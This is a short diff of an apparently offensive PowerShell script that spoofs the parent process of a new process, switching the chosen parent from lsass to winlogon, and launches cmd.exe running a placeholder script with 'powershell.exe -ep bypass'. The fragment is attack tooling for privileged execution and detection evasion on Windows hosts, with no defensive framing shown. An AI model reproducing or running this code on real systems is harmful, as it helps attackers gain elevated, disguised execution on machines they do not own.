@@ -157,7 +157,7 @@ if (-not ([System.Management.Automation.PSTypeName]'MyProcess').Type)
     Add-Type -TypeDefinition $mycode
 }
 
-$ppid =  $(get-process -name "lsass" | select -expand id)
+$ppid =  $(get-process -name "winlogon" | select -expand id)[0]
 $command = "cmd.exe"
 $cmdargs = "/c powershell.exe -ep bypass -file {{REMOTE_FILE_GOES_HERE}}"
 
